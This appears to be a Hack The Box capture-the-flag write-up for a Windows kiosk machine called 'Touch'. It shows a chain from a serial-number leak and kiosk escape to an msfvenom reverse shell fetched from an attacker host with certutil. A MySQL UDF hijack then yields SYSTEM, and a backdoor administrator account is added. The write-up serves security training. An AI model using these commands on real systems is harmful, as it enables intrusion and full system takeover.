# Touch (HTB)

> Platform: Hack The Box  
> Season: 12 / Aero  
> OS: Windows 11 24H2+ (Build 26100)  
> Difficulty: Easy  
> Result: nt authority\system

---

## Attack Chain

```text
Reconnaissance
├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
├── ffuf /FUZZ → /login (200), /api (403)
└── ffuf /api/FUZZ → /api/status → serial <SERIAL>

Foothold (DeviceHub → RDP)
├── /login → password = serial (<SERIAL>)
├── Found credentials: KioskUser / <PASSWORD>
├── xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63
└── Kiosk HTB Airways

Kiosk Escape
├── Booking Ref: KS7X2M / Last Name: CRAWFORD
├── DOCUMENT VERIFICATION → Scan → error
├── DeviceHub → turn off the scanner
├── Scan → new error with a clickable link
├── Click → browser outside the kiosk
├── Ctrl+O → C:\Windows\System32\cmd.exe
└── shell: kiosk-042\kioskuser → type user.txt → <USER_FLAG>

Shell Upgrade (Meterpreter)
├── msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o shell.exe
├── python3 -m http.server 8000
├── msfconsole → multi/handler
├── certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
└── shell.exe → Meterpreter session

Privilege Check
├── getuid → KIOSK-042\KioskUser
├── sysinfo → Windows 11 24H2+ (Build 26100)
├── whoami /priv → no SeImpersonatePrivilege
└── whoami /groups → Printer Administrators, RDP Users, Users

Enumeration (Source Code)
├── C:\Program Files\HTB Airways\Kiosk\ (Node/Express/React)
├── C:\Program Files\Nexion Systems\DocReader\ (.NET DeviceHub)
├── C:\Program Files\Nexion Systems\Printer\
├── C:\MySQL\ (MySQL Server 8.0)
├── document-service.ts → OCR MRZ (tesseract.js)
├── staff.ts → QR HTBAW-STAFF:<email>:<authCode>
├── database/index.ts → kiosk_app:<PASSWORD>
└── MySQL → SELECT * FROM _htb_staff

Credential Leak (MySQL root)
├── C:\ProgramData\HTB Airways\db-config.ini
├── C:\ProgramData\HTB Airways\refresh-dates.bat
│   └── -u root -p<PASSWORD>
├── SELECT user, host, Grant_priv, File_priv FROM mysql.user → root:Y:Y
└── icacls C:\MySQL\lib\plugin → Authenticated Users:(M)

Privilege Escalation (MySQL UDF Hijacking)
├── meterpreter upload lib_mysqludf_sys_64.dll → C:\MySQL\lib\plugin\
├── CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'
├── SELECT sys_eval('whoami') → nt authority\system
├── SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt') → <ROOT_FLAG>
└── Optional: net user hacker /add → Administrators → RDP/WinRM
```

> Note: All flags, passwords, and hashes have been masked for ethical reasons.

---

## Machine Briefing

In the description of the previous machine, **Layover**, the following name and booking reference were found:

```
Jenny Crawford / KS7X2M
```

---

## Reconnaissance

```bash
nmap -sV -sC 10.129.71.63
```

| Port | Service                                   |
|------|-------------------------------------------|
| 135  | Microsoft Windows RPC                     |
| 3389 | Microsoft Terminal Service (RDP)          |
| 5985 | Microsoft HTTPAPI httpd 2.0 (WinRM)       |
| 8443 | Microsoft HTTPAPI httpd 2.0 - Nexion DeviceHub |

Port 8443 - **Nexion DeviceHub - Login**.

---

## Web Reconnaissance

```bash
ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /login (200), /api (403)

ffuf -u http://10.129.71.63:8443/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
# /api/status
```

`/api/status` returns:

```json
{"serial":"<SERIAL>","status":"online", ...}
```

---

## Foothold (DeviceHub → RDP)

Hint on `/login`: *"default device password is its own serial number"*.

Password:

```
<SERIAL>
```

In the DeviceHub panel:

```
KioskUser / <PASSWORD>
```

### RDP

```bash
xfreerdp /u:KioskUser /p:'<PASSWORD>' /v:10.129.71.63 /clipboard /dynamic-resolution
```

Full-screen HTB Airways kiosk.

---

## Kiosk Escape

### Entering the booking

```
Booking Ref: KS7X2M
Last Name: CRAWFORD
```

DOCUMENT VERIFICATION screen → **Scan** → error.

### Manipulating the hardware

DeviceHub → turn off the scanner → search again → Scan → a different error with a **clickable link**.

### Escape

Clicking the link opens a full browser outside the kiosk.

**Ctrl+O** → `C:\Windows\System32\cmd.exe`.

Shell as:

```
kiosk-042\kioskuser
```

### User flag

```cmd
type C:\Users\KioskUser\Desktop\user.txt
```

```
<USER_FLAG>
```

---

## Shell Upgrade (Meterpreter)

```bash
ip a
mkdir -p /tmp/share && cd /tmp/share
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o /tmp/share/shell.exe
python3 -m http.server 8000
```

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.82; set LPORT 4445; exploit"
```

Download and execute:

```cmd
certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
C:\Users\KioskUser\Desktop\shell.exe
```

```
[*] Meterpreter session 1 opened (10.10.14.82:4445 -> 10.129.76.83:xxxxx)
```

---

## Privilege Check

```
meterpreter > getuid
Server username: KIOSK-042\KioskUser

meterpreter > sysinfo
Computer : KIOSK-042
OS       : Windows 11 24H2+ (10.0 Build 26100)
Arch     : x64
```

```cmd
whoami /priv
whoami /groups
```

**Privileges:** `SeChangeNotifyPrivilege`, `SeUndockPrivilege`, `SeIncreaseWorkingSetPrivilege`, `SeTimeZonePrivilege`.

**Groups:** `KIOSK-042\Printer Administrators`, `BUILTIN\Remote Desktop Users`, `BUILTIN\Users`.

**`SeImpersonatePrivilege` is absent** - JuicyPotato/PrintSpoofer/GodPotato do not apply.

---

## Enumeration (Source Code)

```cmd
dir "C:\Program Files\HTB Airways\Kiosk\"
dir "C:\Program Files\Nexion Systems\DocReader\"
dir "C:\Program Files\Nexion Systems\Printer\"
dir C:\MySQL\
```

| Path | Description |
|------|-------------|
| `C:\Program Files\HTB Airways\Kiosk\` | Node/Express/React kiosk app |
| `C:\Program Files\Nexion Systems\DocReader\` | .NET DeviceHub backend (port 8443) |
| `C:\Program Files\Nexion Systems\Printer\` | .NET printer service |
| `C:\MySQL\` | MySQL Server 8.0 |

```cmd
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\services\document-service.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\routes\staff.ts"
type "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\database\index.ts"
```

Key points:

- `document-service.ts` - OCR MRZ via tesseract.js.
- `staff.ts` - decodes QR `HTBAW-STAFF:<email>:<authCode>`, validates against `_htb_staff`.

**MySQL credentials from `database/index.ts`:**

```
host: 127.0.0.1
port: 3306
user: kiosk_app
password: <PASSWORD>
database: htb_airways
```

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -p<PASSWORD> -h 127.0.0.1 -P 3306 htb_airways -e "SELECT employee_id, email, auth_code, role, active FROM _htb_staff;"
```

---

## Finding the MySQL root password

```cmd
type "C:\ProgramData\HTB Airways\db-config.ini"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
type "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

`refresh-dates.bat`:

```bat
C:\MySQL\bin\mysql.exe -u root -p<PASSWORD> < "C:\ProgramData\HTB Airways\refresh-dates.sql"
```

---

## Checking root privileges

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT user, host, Grant_priv, File_priv FROM mysql.user;"
```

```
root  localhost  Y  Y
```

`File_priv = Y` → UDF hijacking is possible.

```powershell
icacls "C:\MySQL\lib\plugin"
```

```
NT AUTHORITY\Authenticated Users:(I)(M)
```

`M` - `KioskUser` can write to the plugin directory.

---

## Privilege Escalation (MySQL UDF Hijacking)

Uploading the DLL:

```
meterpreter > upload /opt/metasploit/data/exploits/mysql/lib_mysqludf_sys_64.dll "C:\\MySQL\\lib\\plugin\\lib_mysqludf_sys_64.dll"
```

Or via certutil:

```powershell
certutil -urlcache -split -f http://10.10.14.82:8001/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

Creating the function:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';"
```

Verification:

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('whoami');"
# nt authority\system
```

**Mechanics:** MySQL runs as a Windows service under `NT AUTHORITY\SYSTEM`. The `sys_eval` UDF from the loaded DLL executes shell commands via SQL queries with the same privileges.

---

## Root flag

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
```

```
<ROOT_FLAG>
```

### Optional - interactive SYSTEM

```powershell
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net user hacker P@ssw0rd123! /add');"
& "C:\MySQL\bin\mysql.exe" -u root -p"<PASSWORD>" -e "SELECT sys_eval('net localgroup Administrators hacker /add');"
```

Then - RDP/WinRM as `hacker`.

---

## Flags

| Flag | Value                            |
|------|----------------------------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **Serial number leak via `/api/status` without authentication** - the DeviceHub password.
- **Kiosk escape by manipulating hardware state** - turning off the scanner in the admin panel → a new error with a clickable link.
- **Ctrl+O as a universal escape hatch** - the Open File dialog gives access to Explorer and lets you launch `cmd.exe`.
- **Plaintext passwords in .bat/.sql** - `refresh-dates.bat` contains the MySQL root password.
- **MySQL File_priv + writable plugin directory = RCE** - UDF hijacking.
- **MySQL as a Windows service runs as SYSTEM** - compromising the DBMS with a UDF yields SYSTEM directly.
- **Absence of SeImpersonatePrivilege is not a dead end** - look for alternative vectors via local services.
